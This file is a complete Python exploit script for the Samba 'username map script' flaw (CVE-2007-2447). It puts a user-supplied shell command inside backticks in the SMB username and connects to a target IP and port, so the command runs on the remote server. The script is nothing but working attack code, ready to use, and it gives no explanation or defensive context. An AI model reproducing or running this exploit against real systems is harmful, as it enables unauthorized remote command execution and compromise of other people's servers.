#!/usr/bin/python3
import sys, argparse, asyncio
from smb.SMBConnection import SMBConnection

class SMBExploit:
    def __init__(self, ip, port, payload):
        self.ip = ip
        self.port = port
        self.payload = payload

    async def run(self):
        if self.ip and self.port and self.payload:
            user = '`/nohup ' + self.payload + '`'
            conn = SMBConnection(user, 'na', 'na', 'na', use_ntlm_v2=False)
            try:
                print(f'[*] Sending the {self.payload}')
                await asyncio.to_thread(conn.connect, self.ip, int(self.port))
                print(f'Connecting to {self.ip}, {self.port}!')
                print(f'[*] Payload: {self.payload} was sent successfully!')
            except Exception as e:
                print(f'[*] Error: {e}')
        else:
            print('Invalid Arguments Supplied!')

async def main(ip, port, payload):
    smb_exploit = SMBExploit(ip, port, payload)
    await smb_exploit.run()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
                    prog = 'Samba Usermap Exploit',
                    description = 'Exploits the CVE-2007-2447 vulnerability',
                    epilog = '')
    parser.add_argument('-i', '--ip', type=str, help='Target IP Address', required=True)
    parser.add_argument('-p', '--port', type=int, help='Target Port (Common port: 139)', required=True)
    parser.add_argument('-pl', '--payload', type=str, help='Payload to be executed on target machine', required=True)
    args = parser.parse_args()
    ip = args.ip
    port = args.port
    payload = args.payload

    asyncio.run(main(ip, port, payload))
